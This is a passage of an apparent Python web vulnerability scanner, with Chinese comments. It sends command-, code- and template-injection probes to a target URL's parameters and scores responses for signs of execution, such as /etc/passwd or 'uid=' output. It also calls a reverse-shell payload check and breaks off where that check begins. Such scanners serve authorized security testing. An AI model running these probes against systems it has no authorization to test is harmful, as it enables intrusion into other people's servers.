                        vulnerabilities.append({
                            'type': 'Command Injection (Time-Based)',
                            'payload': payload,
                            'os': 'Windows',
                            'confidence': '高',
                            'evidence': {
                                'baseline_time': round(normal_time, 2),
                                'delayed_time_1': round(elapsed_time, 2),
                                'delayed_time_2': round(elapsed_time2, 2),
                                'threshold': round(adaptive_threshold, 2)
                            },
                            'technique': 'Time-based blind injection',
                            'separator': separator
                        })
                        break
            
            except Exception as e:
                if "timeout" in str(e).lower():
                    try:
                        start_time2 = time.time()
                        self._send_command_test(url, param_name, test_value, method, post_data,
                                               timeout=int(adaptive_threshold) + 10)
                        elapsed_time2 = time.time() - start_time2
                        
                        if elapsed_time2 > adaptive_threshold or "timeout" in str(e).lower():
                            vulnerabilities.append({
                                'type': 'Command Injection (Time-Based - Confirmed Timeout)',
                                'payload': payload,
                                'os': 'Windows',
                                'confidence': '高',
                                'evidence': '请求超时（多次确认），说明命令执行成功',
                                'technique': 'Time-based blind injection (timeout)',
                                'separator': separator
                            })
                            break
                    except:
                        pass
        
        return vulnerabilities

    def detect_command_file_operations(self, url, param_name, param_value, method, post_data):
        """基于文件操作的命令执行检测"""
        vulnerabilities = []
        
        # 测试Unix文件操作payloads
        for payload_info in self.command_payloads.get("unix_file", [])[:5]:
            payload = payload_info["payload"]
            separator = payload_info["separator"]
            
            try:
                test_value = f"{param_value}{payload}"
                response = self._send_command_test(url, param_name, test_value, method, post_data)
                
                if response:
                    content = response['response'].get('content', '')
                    if not isinstance(content, str):
                        content = str(content)
                    
                    # 检查常见的系统文件内容
                    file_indicators = [
                        "root:",  # /etc/passwd
                        "bin/",   # 系统目录
                        "/home/", # 用户目录
                        "total ", # ls -la 输出
                        "drwx",   # 目录权限
                        "-rwx",   # 文件权限
                        "uid=",   # id 命令输出
                        "gid="    # id 命令输出
                    ]
                    
                    for indicator in file_indicators:
                        if indicator.lower() in content.lower():
                            vulnerabilities.append({
                                'type': 'Command Injection (File Operation)',
                                'payload': payload,
                                'os': 'Unix/Linux',
                                'confidence': '高',
                                'evidence': f"发现文件操作痕迹: {indicator}",
                                'technique': 'File system access',
                                'separator': separator,
                                'response_code': response['response'].get('status_code', 0)
                            })
                            break
            
            except Exception:
                continue
        
        # 测试Windows文件操作payloads
        for payload_info in self.command_payloads.get("windows_file", [])[:5]:
            payload = payload_info["payload"]
            separator = payload_info["separator"]
            
            try:
                test_value = f"{param_value}{payload}"
                response = self._send_command_test(url, param_name, test_value, method, post_data)
                
                if response:
                    content = response['response'].get('content', '')
                    if not isinstance(content, str):
                        content = str(content)
                    
                    # 检查Windows系统信息
                    windows_indicators = [
                        "Volume in drive",
                        "Directory of",
                        "Administrator",
                        "C:\\\\",
                        "Program Files",
                        "Windows",
                        "ipconfig",
                        "Ethernet adapter"
                    ]
                    
                    for indicator in windows_indicators:
                        if indicator.lower() in content.lower():
                            vulnerabilities.append({
                                'type': 'Command Injection (File Operation)',
                                'payload': payload,
                                'os': 'Windows',
                                'confidence': '高',
                                'evidence': f"发现Windows系统信息: {indicator}",
                                'technique': 'File system access',
                                'separator': separator,
                                'response_code': response['response'].get('status_code', 0)
                            })
                            break
            
            except Exception:
                continue
        
        return vulnerabilities

    def detect_command_blind_injection(self, url, param_name, param_value, method, post_data):
        """盲注命令执行检测"""
        vulnerabilities = []
        
        # 测试条件payloads验证漏洞
        for payload_info in self.command_payloads.get("conditional", [])[:3]:
            payload = payload_info["payload"]
            os_type = payload_info["os"]
            separator = payload_info["separator"]
            
            try:
                test_value = f"{param_value}{payload}"
                response = self._send_command_test(url, param_name, test_value, method, post_data)
                
                if response:
                    content = response['response'].get('content', '')
                    if not isinstance(content, str):
                        content = str(content)
                    
                    # 检查条件输出
                    if "COMMAND_TEST" in content and "VERIFIED" in content:
                        vulnerabilities.append({
                            'type': 'Command Injection (Conditional Output)',
                            'payload': payload,
                            'os': os_type,
                            'confidence': '高',
                            'evidence': '条件输出验证成功',
                            'technique': 'Conditional command execution',
                            'separator': separator,
                            'response_code': response['response'].get('status_code', 0)
                        })
            
            except Exception:
                continue
        
        return vulnerabilities

    def _send_command_test(self, url, param_name, param_value, method, post_data, timeout=None):
        """发送命令执行测试请求"""
        try:
            request_info = {
                'method': method.upper(),
                'url': url,
                'headers': {},
                'allow_redirects': True
            }
            
            if timeout:
                request_info['timeout'] = timeout
            
            if method.upper() == "GET":
                test_url = self._build_url_with_param(url, param_name, param_value)
                request_info['url'] = test_url
            else:
                data = post_data.copy() if post_data else {}
                data[param_name] = param_value
                request_info['data'] = data
            
            return self.send_controlled_request(request_info)
        except Exception as e:
            print(f"命令测试请求失败: {e}")
            return None

    def _measure_response_time(self, url, param_name, param_value, method, post_data):
        """测量响应时间"""
        try:
            start_time = time.time()
            
            response = self._send_command_test(url, param_name, param_value, method, post_data)
            if response:
                return time.time() - start_time
        except:
            return float('inf')
        
        return float('inf')

    # ==================== 代码执行检测方法 ====================

    def detect_code_eval_based(self, url, param_name, param_value, method, post_data):
        """
        基于eval的代码执行检测 - 极度增强版(极度减少误报)
        
        检测流程：
        1. 获取基准响应用于对比(关键)
        2. 测试各语言eval payloads
        3. 排除基准响应中已有的指示器(关键)
        4. 严格的多层证据验证 - 需要至少3个不同的证据
        5. 对比负载注入前后内容差异(新增)
        6. 排除常见误报模式(新增)
        """
        vulnerabilities = []
        
        # 获取基准响应(关键改进)
        baseline_response = self.get_baseline_response(url, param_name, param_value, method, post_data)
        baseline_content = baseline_response.get('content', '') if baseline_response else ''
        baseline_length = len(baseline_content)
        
        # 排除常见误报URL - 这些URL本身就会返回错误页面
        false_positive_patterns = [
            'error', 'error.php', '404', '500', 'exception',
            'debug', 'trace', 'backtrace', 'stack'
        ]
        url_lower = url.lower()
        is_error_url = any(pattern in url_lower for pattern in false_positive_patterns)
        
        # 测试PHP eval payloads
        for payload_info in self.code_payloads.get("php_direct", [])[:5]:
            payload = payload_info["payload"]
            language = payload_info["language"]
            context = payload_info["context"]
            
            try:
                test_value = f"{param_value}{payload}"
                response = self._send_code_test(url, param_name, test_value, method, post_data)
                
                if response:
                    content = response['response'].get('content', '')
                    if not isinstance(content, str):
                        content = str(content)
                    
                    # 严格的多层证据收集 - 增强版
                    evidence_list = []
                    confidence = 0
                    evidence_count = 0
                    
                    # 预过滤1：排除过于相似的内容(可能是通用错误页面)
                    response_similarity = self._calculate_similarity(baseline_content, content)
                    if response_similarity > 0.95:  # 内容太相似，可能是通用错误页面
                        continue
                    
                    # 预过滤2：如果是错误页面URL且响应中仍然包含标准错误信息，很可能误报
                    if is_error_url and any(p in content.lower() for p in ['error', 'exception', '404', '500']):
                        continue
                    
                    # 证据1：寻找输出指示器(排除基准已有的)
                    php_indicators = self.code_indicators.get("php_output", [])
                    for indicator in php_indicators:
                        # 关键改进: 严格排除基准响应中已有的指示器
                        if indicator.lower() in baseline_content.lower():
                            continue
                        
                        # 确认指示器是真正新增的
                        if indicator.lower() in content.lower():
                            # 计算新增内容的占比
                            new_content_ratio = self._extract_context(content, indicator)
                            if new_content_ratio > 0.02:  # 新内容占比>2%
                                evidence_list.append(f"PHP输出: {indicator}")
                                confidence = max(confidence, 0.95)
                                evidence_count += 1
                                break
                    
                    # 证据2：分析错误堆栈识别PHP - 需要多个特定模式
                    php_error_patterns = [
                        ("parse error", "on line"),      # PHP Parse Error
                        ("fatal error", "throw"),         # Fatal Error
                        ("warning", "function"),          # PHP Warning  
                        ("notice", "undefined")           # PHP Notice
                    ]
                    for pattern1, pattern2 in php_error_patterns:
                        if (pattern1.lower() in content.lower() and pattern2.lower() in content.lower() and
                            pattern1.lower() not in baseline_content.lower()):
                            evidence_list.append(f"PHP错误堆栈: {pattern1.upper()}")
                            confidence = max(confidence, 0.85)
                            evidence_count += 1
                            break
                    
                    # 证据3：检查特定PHP特征(必须是新增的)
                    php_code_markers = ["<?php", "$_GET", "$_POST", "$_COOKIE", "$_SERVER"]
                    new_php_markers = 0
                    for marker in php_code_markers:
                        if marker in content and marker not in baseline_content:
                            new_php_markers += 1
                    
                    if new_php_markers >= 2:  # 至少2个新的PHP特征
                        evidence_list.append(f"PHP代码特征({new_php_markers}个新标记)")
                        confidence = max(confidence, 0.80)
                        evidence_count += 1
                    
                    # 证据4：响应长度显著增加(新增)
                    length_diff = len(content) - baseline_length
                    if length_diff > 500 and "error" in content.lower():  # 增加>500字节且含错误信息
                        evidence_list.append(f"响应长度增加(+{length_diff}字节)")
                        confidence = max(confidence, 0.70)
                        evidence_count += 1
                    
                    # 证据5：特定PHP函数执行迹象(新增)
                    php_functions = ["phpinfo", "system", "exec", "passthru", "shell_exec", "proc_open"]
                    for func in php_functions:
                        if func in content.lower() and func not in baseline_content.lower():
                            evidence_list.append(f"PHP函数执行: {func}")
                            confidence = max(confidence, 0.90)
                            evidence_count += 1
                            break
                    
                    # 极度严格的阈值: 需要至少3个不同的证据才报告(大幅减少误报)
                    if evidence_count >= 3 and confidence > 0.80:
                        vulnerabilities.append({
                            'type': 'Code Injection (Eval-Based)',
                            'payload': payload,
                            'language': language,
                            'confidence': '高' if confidence > 0.85 else '中',
                            'evidence': " | ".join(evidence_list),
                            'technique': 'PHP eval() execution',
                            'context': context,
                            'response_code': response['response'].get('status_code', 0),
                            'confidence_score': round(confidence, 2),
                            'evidence_count': evidence_count
                        })
            
            except Exception:
                continue
        
        # 测试Python eval payloads
        for payload_info in self.code_payloads.get("python_eval", [])[:5]:
            payload = payload_info["payload"]
            language = payload_info["language"]
            context = payload_info["context"]
            
            try:
                test_value = f"{param_value}{payload}"
                response = self._send_code_test(url, param_name, test_value, method, post_data)
                
                if response:
                    content = response['response'].get('content', '')
                    if not isinstance(content, str):
                        content = str(content)
                    
                    evidence_list = []
                    confidence = 0
                    
                    # 方法1：寻找Python输出
                    python_indicators = self.code_indicators.get("python_output", [])
                    for indicator in python_indicators:
                        if indicator.lower() in content.lower():
                            evidence_list.append(f"Python输出: {indicator}")
                            confidence = max(confidence, 0.95)
                            break
                    
                    # 方法2：识别Python错误堆栈
                    python_error_patterns = [
                        r"Traceback \(most recent call last\)",
                        r"NameError:",
                        r"TypeError:",
                        r"SyntaxError:",
                    ]
                    for pattern in python_error_patterns:
                        if re.search(pattern, content):
                            evidence_list.append("检测到Python错误堆栈")
                            confidence = max(confidence, 0.90)
                            break
                    
                    # 方法3：Python代码特征
                    if "import " in content or "def " in content or "class " in content:
                        evidence_list.append("检测到Python代码特征")
                        confidence = max(confidence, 0.80)
                    
                    if evidence_list and confidence > 0.75:
                        vulnerabilities.append({
                            'type': 'Code Injection (Eval-Based)',
                            'payload': payload,
                            'language': language,
                            'confidence': '高' if confidence > 0.85 else '中',
                            'evidence': " | ".join(evidence_list),
                            'technique': 'Python eval()/exec() execution',
                            'context': context,
                            'response_code': response['response'].get('status_code', 0),
                            'confidence_score': round(confidence, 2)
                        })
            
            except Exception:
                continue
        
        # 测试Node.js eval payloads
        for payload_info in self.code_payloads.get("nodejs_eval", [])[:5]:
            payload = payload_info["payload"]
            language = payload_info["language"]
            context = payload_info["context"]
            
            try:
                test_value = f"{param_value}{payload}"
                response = self._send_code_test(url, param_name, test_value, method, post_data)
                
                if response:
                    content = response['response'].get('content', '')
                    if not isinstance(content, str):
                        content = str(content)
                    
                    evidence_list = []
                    confidence = 0
                    
                    # 方法1：Node.js输出指示器
                    nodejs_indicators = self.code_indicators.get("nodejs_output", [])
                    for indicator in nodejs_indicators:
                        if indicator.lower() in content.lower():
                            evidence_list.append(f"Node.js输出: {indicator}")
                            confidence = max(confidence, 0.95)
                            break
                    
                    # 方法2：Node.js错误堆栈
                    if "at " in content and ("Function" in content or "Object" in content):
                        evidence_list.append("检测到Node.js错误堆栈")
                        confidence = max(confidence, 0.85)
                    
                    # 方法3：JavaScript特征
                    if "function " in content or "const " in content or "var " in content:
                        evidence_list.append("检测到JavaScript特征")
                        confidence = max(confidence, 0.80)
                    
                    if evidence_list and confidence > 0.75:
                        vulnerabilities.append({
                            'type': 'Code Injection (Eval-Based)',
                            'payload': payload,
                            'language': language,
                            'confidence': '高' if confidence > 0.85 else '中',
                            'evidence': " | ".join(evidence_list),
                            'technique': 'Node.js eval() execution',
                            'context': context,
                            'response_code': response['response'].get('status_code', 0),
                            'confidence_score': round(confidence, 2)
                        })
            
            except Exception:
                continue
        
        return vulnerabilities

    def detect_code_system_based(self, url, param_name, param_value, method, post_data):
        """
        基于系统调用的代码执行检测 - 多层验证和语言识别
        
        检测策略：
        1. 多指示器匹配（强/弱指示器）
        2. 错误堆栈分析识别语言
        3. 置信度评分基于匹配证据数量
        """
        vulnerabilities = []
        
        # 定义强弱指示器
        strong_indicators = ["root:", "uid=", "gid=", "groups=", "Administrator", "C:\\\\"]
        weak_indicators = ["COMMAND_TEST", "whoami", "user"]
        
        # 测试PHP系统调用
        for payload_info in self.code_payloads.get("php_system", [])[:5]:
            payload = payload_info["payload"]
            language = payload_info["language"]
            context = payload_info["context"]
            
            try:
                test_value = f"{param_value}{payload}"
                response = self._send_code_test(url, param_name, test_value, method, post_data)
                
                if response:
                    content = response['response'].get('content', '')
                    if not isinstance(content, str):
                        content = str(content)
                    
                    # 多层证据收集
                    evidence_list = []
                    confidence = 0
                    matched_indicators = []
                    
                    # 检查强指示器（命令执行输出）
                    for indicator in strong_indicators:
                        if indicator.lower() in content.lower():
                            evidence_list.append(f"命令执行证据: {indicator}")
                            matched_indicators.append(indicator)
                            confidence = max(confidence, 0.95)
                    
                    # 检查弱指示器
                    if not matched_indicators:
                        for indicator in weak_indicators:
                            if indicator.lower() in content.lower():
                                evidence_list.append(f"可能的命令输出: {indicator}")
                                confidence = max(confidence, 0.80)
                    
                    # 检查PHP错误堆栈（表示代码被执行）
                    if "parse error" in content.lower() or "fatal error" in content.lower() or "warning" in content.lower():
                        if "php" in content.lower():
                            evidence_list.append("检测到PHP执行特征")
                            confidence = max(confidence, 0.85)
                    
                    if evidence_list and confidence > 0.75:
                        vulnerabilities.append({
                            'type': 'Code Injection (System Call)',
                            'payload': payload,
                            'language': language,
                            'confidence': '高' if confidence > 0.85 else '中',
                            'evidence': " | ".join(evidence_list),
                            'matched_indicators': matched_indicators,
                            'technique': 'PHP system()/exec() execution',
                            'context': context,
                            'response_code': response['response'].get('status_code', 0),
                            'confidence_score': round(confidence, 2)
                        })
            
            except Exception:
                continue
        
        # 测试Python系统调用
        for payload_info in self.code_payloads.get("python_os", [])[:5]:
            payload = payload_info["payload"]
            language = payload_info["language"]
            context = payload_info["context"]
            
            try:
                test_value = f"{param_value}{payload}"
                response = self._send_code_test(url, param_name, test_value, method, post_data)
                
                if response:
                    content = response['response'].get('content', '')
                    if not isinstance(content, str):
                        content = str(content)
                    
                    evidence_list = []
                    confidence = 0
                    matched_indicators = []
                    
                    # 检查命令执行指示器
                    for indicator in strong_indicators:
                        if indicator.lower() in content.lower():
                            evidence_list.append(f"命令执行证据: {indicator}")
                            matched_indicators.append(indicator)
                            confidence = max(confidence, 0.95)
                    
                    if not matched_indicators:
                        for indicator in weak_indicators:
                            if indicator.lower() in content.lower():
                                evidence_list.append(f"可能的命令输出: {indicator}")
                                confidence = max(confidence, 0.80)
                    
                    # 检查Python错误堆栈
                    if re.search(r"Traceback|NameError:|TypeError:|SyntaxError:", content):
                        evidence_list.append("检测到Python执行特征")
                        confidence = max(confidence, 0.85)
                    
                    if evidence_list and confidence > 0.75:
                        vulnerabilities.append({
                            'type': 'Code Injection (System Call)',
                            'payload': payload,
                            'language': language,
                            'confidence': '高' if confidence > 0.85 else '中',
                            'evidence': " | ".join(evidence_list),
                            'matched_indicators': matched_indicators,
                            'technique': 'Python os.system() execution',
                            'context': context,
                            'response_code': response['response'].get('status_code', 0),
                            'confidence_score': round(confidence, 2)
                        })
            
            except Exception:
                continue
        
        # 测试Java Runtime执行
        for payload_info in self.code_payloads.get("java_runtime", [])[:5]:
            payload = payload_info["payload"]
            language = payload_info["language"]
            context = payload_info["context"]
            
            try:
                test_value = f"{param_value}{payload}"
                response = self._send_code_test(url, param_name, test_value, method, post_data)
                
                if response:
                    content = response['response'].get('content', '')
                    if not isinstance(content, str):
                        content = str(content)
                    
                    evidence_list = []
                    confidence = 0
                    matched_indicators = []
                    
                    # 检查命令执行指示器
                    for indicator in strong_indicators:
                        if indicator.lower() in content.lower():
                            evidence_list.append(f"命令执行证据: {indicator}")
                            matched_indicators.append(indicator)
                            confidence = max(confidence, 0.95)
                    
                    # 检查Java特定输出
                    java_indicators = self.code_indicators.get("java_output", [])
                    for indicator in java_indicators:
                        if indicator.lower() in content.lower():
                            evidence_list.append(f"Java输出: {indicator}")
                            confidence = max(confidence, 0.90)
                    
                    # 检查Java错误堆栈
                    if "Exception" in content or "at java." in content:
                        evidence_list.append("检测到Java执行特征")
                        confidence = max(confidence, 0.80)
                    
                    if evidence_list and confidence > 0.75:
                        vulnerabilities.append({
                            'type': 'Code Injection (System Call)',
                            'payload': payload,
                            'language': language,
                            'confidence': '高' if confidence > 0.85 else '中',
                            'evidence': " | ".join(evidence_list),
                            'matched_indicators': matched_indicators,
                            'technique': 'Java Runtime.exec() execution',
                            'context': context,
                            'response_code': response['response'].get('status_code', 0),
                            'confidence_score': round(confidence, 2)
                        })
            
            except Exception:
                continue
        
        return vulnerabilities

    def detect_code_template_injection(self, url, param_name, param_value, method, post_data):
        """
        模板注入检测 - 多验证层和计算表达式验证
        
        核心验证方式：
        1. 基础模板语法测试（{{7*7}}）
        2. 模板计算结果验证（期望49）
        3. 多语言特定模板测试
        4. 错误堆栈分析确认
        """
        vulnerabilities = []
        
        # 通用模板注入payload
        generic_payloads = [
            {"template": "{{7*7}}", "expected": "49", "language": "generic"},
            {"template": "${7*7}", "expected": "49", "language": "generic"},
            {"template": "<%=7*7%>", "expected": "49", "language": "jsp"},
            {"template": "[[ 7*7 ]]", "expected": "49", "language": "generic"},
        ]
        
        # 测试通用模板注入payloads
        for payload_config in generic_payloads:
            template_payload = payload_config["template"]
            expected_result = payload_config["expected"]
            
            try:
                test_value = f"{param_value}{template_payload}"
                response = self._send_code_test(url, param_name, test_value, method, post_data)
                
                if response:
                    content = response['response'].get('content', '')
                    if not isinstance(content, str):
                        content = str(content)
                    
                    # 关键验证：是否返回计算结果
                    if expected_result in content:
                        vulnerabilities.append({
                            'type': 'Template Injection',
                            'payload': template_payload,
                            'language': 'generic',
                            'confidence': '高',
                            'evidence': f"模板计算验证成功: {template_payload} = {expected_result}",
                            'technique': 'Template expression evaluation',
                            'verified': True,
                            'response_code': response['response'].get('status_code', 0)
                        })
                        continue
                    
                    # 如果没有直接计算结果，检查是否有模板错误或执行痕迹
                    template_indicators = [
                        "template", "jinja", "undefined", "expression",
                        "render", "template error", "template syntax"
                    ]
                    for indicator in template_indicators:
                        if indicator in content.lower():
                            vulnerabilities.append({
                                'type': 'Template Injection',
                                'payload': template_payload,
                                'language': 'generic',
                                'confidence': '中',
                                'evidence': f"检测到模板引擎痕迹: {indicator}",
                                'technique': 'Template engine interaction',
                                'verified': False,
                                'response_code': response['response'].get('status_code', 0)
                            })
                            break
            
            except Exception:
                continue
        
        # 测试特定语言模板
        language_specific_payloads = [
            {
                "type": "python_template",
                "payloads": [
                    {"payload": "{{7*7}}", "expected": "49", "engine": "Jinja2"},
                    {"payload": "${7*7}", "expected": "49", "engine": "Mako"},
                    {"payload": "#{7*7}", "expected": "49", "engine": "Genshi"},
                ],
                "language": "Python"
            },
            {
                "type": "java_template",
                "payloads": [
                    {"payload": "${7*7}", "expected": "49", "engine": "OGNL"},
                    {"payload": "#{7*7}", "expected": "49", "engine": "EL"},
                    {"payload": "<%=7*7%>", "expected": "49", "engine": "JSP"},
                ],
                "language": "Java"
            },
            {
                "type": "nodejs_template",
                "payloads": [
                    {"payload": "<%=7*7%>", "expected": "49", "engine": "EJS"},
                    {"payload": "{{7*7}}", "expected": "49", "engine": "Handlebars"},
                    {"payload": "${7*7}", "expected": "49", "engine": "lodash"},
                ],
                "language": "Node.js"
            }
        ]
        
        for language_group in language_specific_payloads:
            payloads = language_group.get("payloads", [])
            language = language_group.get("language", "Unknown")
            
            for payload_config in payloads[:2]:  # 每种语言最多测试2个
                payload = payload_config["payload"]
                expected = payload_config["expected"]
                engine = payload_config["engine"]
                
                try:
                    test_value = f"{param_value}{payload}"
                    response = self._send_code_test(url, param_name, test_value, method, post_data)
                    
                    if response:
                        content = response['response'].get('content', '')
                        if not isinstance(content, str):
                            content = str(content)
                        
                        # 计算结果验证
                        if expected in content:
                            vulnerabilities.append({
                                'type': 'Template Injection',
                                'payload': payload,
                                'language': language,
                                'template_engine': engine,
                                'confidence': '高',
                                'evidence': f"{engine}计算验证: {payload} = {expected}",
                                'technique': f'{engine} template code execution',
                                'verified': True,
                                'response_code': response['response'].get('status_code', 0),
                                'confidence_score': 0.95
                            })
                        
                        # 错误堆栈识别
                        elif language.lower() in content.lower() and ("error" in content.lower() or "exception" in content.lower()):
                            vulnerabilities.append({
                                'type': 'Template Injection',
                                'payload': payload,
                                'language': language,
                                'template_engine': engine,
                                'confidence': '中',
                                'evidence': f"检测到{language}模板引擎错误堆栈",
                                'technique': f'{engine} template interaction',
                                'verified': False,
                                'response_code': response['response'].get('status_code', 0),
                                'confidence_score': 0.75
                            })
                
                except Exception:
                    continue
        
        return vulnerabilities

    def detect_code_blind_injection(self, url, param_name, param_value, method, post_data):
        """盲注代码执行检测"""
        vulnerabilities = []
        
        # 测试时间盲注
        normal_time = self._measure_response_time(url, param_name, param_value, method, post_data)
        
        for payload_info in self.code_payloads.get("blind_time", [])[:3]:
            payload = payload_info["payload"]
            language = payload_info["language"]
            context = payload_info["context"]
            
            try:
                test_value = f"{param_value}{payload}"
                start_time = time.time()
                
                response = self._send_code_test(url, param_name, test_value, method, post_data,
                                               timeout=self.time_delay_threshold + 5)
                
                elapsed_time = time.time() - start_time
                
                if elapsed_time > self.time_delay_threshold:
                    vulnerabilities.append({
                        'type': 'Code Injection (Time-Based Blind)',
                        'payload': payload,
                        'language': language,
                        'confidence': '中',
                        'evidence': {
                            'normal_response_time': normal_time,
                            'delayed_response_time': elapsed_time,
                            'threshold': self.time_delay_threshold
                        },
                        'technique': 'Time delay execution',
                        'context': context
                    })
            
            except Exception as e:
                if "timeout" in str(e).lower():
                    vulnerabilities.append({
                        'type': 'Code Injection (Time-Based Blind - Timeout)',
                        'payload': payload,
                        'language': language,
                        'confidence': '中',
                        'evidence': '请求超时',
                        'technique': 'Request timeout',
                        'context': context
                    })
                continue
        
        return vulnerabilities

    def _calculate_similarity(self, text1, text2):
        """计算两个文本的相似度（0-1）"""
        if not text1 or not text2:
            return 0.0
        
        # 简单的字符集相似度计算
        if len(text1) == 0 or len(text2) == 0:
            return 0.0
        
        # 计算汉明距离的简化版本
        len1, len2 = len(text1), len(text2)
        if abs(len1 - len2) > max(len1, len2) * 0.5:  # 长度差异>50%
            return 0.0
        
        # 计算相同字符的比例
        common_chars = sum(1 for c1, c2 in zip(text1, text2) if c1 == c2)
        similarity = common_chars / max(len1, len2)
        return similarity
    
    def _extract_context(self, text, keyword):
        """提取关键词在文本中的上下文占比"""
        if not keyword or keyword not in text:
            return 0.0
        
        # 找到关键词的位置
        idx = text.lower().find(keyword.lower())
        if idx == -1:
            return 0.0
        
        # 计算关键词周围的有效内容
        context_window = 200  # 前后200字符的上下文
        start = max(0, idx - context_window)
        end = min(len(text), idx + len(keyword) + context_window)
        context = text[start:end]
        
        # 关键词及其上下文占比
        ratio = len(context) / len(text) if text else 0.0
        return min(ratio, 1.0)

    def _send_code_test(self, url, param_name, param_value, method, post_data, timeout=None):
        """发送代码执行测试请求"""
        try:
            request_info = {
                'method': method.upper(),
                'url': url,
                'headers': {},
                'allow_redirects': True
            }
            
            if timeout:
                request_info['timeout'] = timeout
            
            if method.upper() == "GET":
                test_url = self._build_url_with_param(url, param_name, param_value)
                request_info['url'] = test_url
            else:
                data = post_data.copy() if post_data else {}
                data[param_name] = param_value
                request_info['data'] = data
            
            return self.send_controlled_request(request_info)
        except Exception as e:
            print(f"代码测试请求失败: {e}")
            return None

    # ==================== 主检测方法 ====================

    def check_command_injection(self, url, param_name=None, param_value=None, method="GET", post_data=None):
        """
        全面的命令注入检测入口
        """
        if isinstance(url, list):
            if url:
                url = url[0]
            else:
                print(f"❌ 错误: url列表为空")
                return [], self.results

        if not isinstance(url, str):
            print(f"❌ 错误: url参数必须是字符串，但得到 {type(url)}")
            return [], self.results

        if not url.startswith(('http://', 'https://')):
            print(f"⚠️  警告: URL缺少协议，添加http://")
            url = f"http://{url}"

        print(f"\n🔍 开始全面检测命令注入: {url}")
        if param_name and param_value:
            print(f"   参数: {param_name} = {param_value}")
        print(f"   方法: {method}")

        vulnerabilities = []

        try:
            # 获取基准响应
            baseline = self.get_baseline_response(url, param_name or "cmd", param_value or "test", method, post_data)

            print("\n[1/5] 基于回显的命令执行检测...")
            echo_results = self.detect_command_echo_based(url, param_name or "cmd", param_value or "test", method, post_data)
            vulnerabilities.extend([self._format_command_vulnerability(vuln, url, param_name, method) for vuln in echo_results])

            print("[2/5] 基于时间的命令执行检测...")
            time_results = self.detect_command_time_based(url, param_name or "cmd", param_value or "test", method, post_data)
            vulnerabilities.extend([self._format_command_vulnerability(vuln, url, param_name, method) for vuln in time_results])

            print("[3/5] 基于文件操作的命令执行检测...")
            file_results = self.detect_command_file_operations(url, param_name or "cmd", param_value or "test", method, post_data)
            vulnerabilities.extend([self._format_command_vulnerability(vuln, url, param_name, method) for vuln in file_results])

            print("[4/5] 盲注命令执行检测...")
            blind_results = self.detect_command_blind_injection(url, param_name or "cmd", param_value or "test", method, post_data)
            vulnerabilities.extend([self._format_command_vulnerability(vuln, url, param_name, method) for vuln in blind_results])

            print("[5/5] 反向Shell payload检测...")
            shell_results = self.detect_reverse_shell(url, param_name or "cmd", param_value or "test", method, post_data)
            vulnerabilities.extend([self._format_command_vulnerability(vuln, url, param_name, method) for vuln in shell_results])

            # 更新统计信息
            self.update_command_statistics(vulnerabilities)

            print(f"\n{'='*60}")
            print(f"命令注入扫描完成！")
            print(f"发现漏洞: {len(vulnerabilities)}")

            if vulnerabilities:
                print(f"\n漏洞详情:")
                for i, vuln in enumerate(vulnerabilities, 1):
                    print(f"{i}. URL: {vuln['url']}")
                    print(f"   类型: {vuln['type']}")
                    print(f"   参数: {vuln.get('parameter', param_name or 'N/A')}")
                    print(f"   方法: {vuln['method']}")
                    print(f"   可信度: {vuln['confidence']}")
                    print(f"   操作系统: {vuln.get('os', 'N/A')}")
                    if 'evidence' in vuln:
                        if isinstance(vuln['evidence'], dict):
                            print(f"   证据: {vuln['evidence']}")
                        else:
                            print(f"   证据: {vuln['evidence']}")

            # 更新全局结果
            self.results['vulnerabilities'].extend(vulnerabilities)

            return vulnerabilities, self.results

        except Exception as e:
            print(f"❌ 命令注入检测过程中发生错误: {e}")
            import traceback
            traceback.print_exc()
            return [], self.results

    def check_code_injection(self, url, param_name=None, param_value=None, method="GET", post_data=None):
        """
        全面的代码执行检测入口
        """
        if isinstance(url, list):
            if url:
                url = url[0]
            else:
                print(f"❌ 错误: url列表为空")
                return [], self.results

        if not isinstance(url, str):
            print(f"❌ 错误: url参数必须是字符串，但得到 {type(url)}")
            return [], self.results

        if not url.startswith(('http://', 'https://')):
            print(f"⚠️  警告: URL缺少协议，添加http://")
            url = f"http://{url}"

        print(f"\n🔍 开始全面检测代码注入: {url}")
        if param_name and param_value:
            print(f"   参数: {param_name} = {param_value}")
        print(f"   方法: {method}")

        vulnerabilities = []

        try:
            # 获取基准响应
            baseline = self.get_baseline_response(url, param_name or "code", param_value or "test", method, post_data)

            print("\n[1/5] 基于eval的代码执行检测...")
            eval_results = self.detect_code_eval_based(url, param_name or "code", param_value or "test", method, post_data)
            vulnerabilities.extend([self._format_code_vulnerability(vuln, url, param_name, method) for vuln in eval_results])

            print("[2/5] 基于系统调用的代码执行检测...")
            system_results = self.detect_code_system_based(url, param_name or "code", param_value or "test", method, post_data)
            vulnerabilities.extend([self._format_code_vulnerability(vuln, url, param_name, method) for vuln in system_results])

            print("[3/5] 模板注入检测...")
            template_results = self.detect_code_template_injection(url, param_name or "code", param_value or "test", method, post_data)
            vulnerabilities.extend([self._format_code_vulnerability(vuln, url, param_name, method) for vuln in template_results])

            print("[4/5] 盲注代码执行检测...")
            blind_results = self.detect_code_blind_injection(url, param_name or "code", param_value or "test", method, post_data)
            vulnerabilities.extend([self._format_code_vulnerability(vuln, url, param_name, method) for vuln in blind_results])

            print("[5/5] 文件包含检测...")
            include_results = self.detect_file_inclusion(url, param_name or "code", param_value or "test", method, post_data)
            vulnerabilities.extend([self._format_code_vulnerability(vuln, url, param_name, method) for vuln in include_results])

            # 更新统计信息
            self.update_code_statistics(vulnerabilities)

            print(f"\n{'='*60}")
            print(f"代码注入扫描完成！")
            print(f"发现漏洞: {len(vulnerabilities)}")

            if vulnerabilities:
                print(f"\n漏洞详情:")
                for i, vuln in enumerate(vulnerabilities, 1):
                    print(f"{i}. URL: {vuln['url']}")
                    print(f"   类型: {vuln['type']}")
                    print(f"   参数: {vuln.get('parameter', param_name or 'N/A')}")
                    print(f"   方法: {vuln['method']}")
                    print(f"   可信度: {vuln['confidence']}")
                    print(f"   编程语言: {vuln.get('language', 'N/A')}")
                    if 'evidence' in vuln:
                        if isinstance(vuln['evidence'], dict):
                            print(f"   证据: {vuln['evidence']}")
                        else:
                            print(f"   证据: {vuln['evidence']}")

            # 更新全局结果
            self.results['vulnerabilities'].extend(vulnerabilities)

            return vulnerabilities, self.results

        except Exception as e:
            print(f"❌ 代码注入检测过程中发生错误: {e}")
            import traceback
            traceback.print_exc()
            return [], self.results

    def detect_reverse_shell(self, url, param_name, param_value, method, post_data):
        """反向Shell payload检测"""
        vulnerabilities = []
        
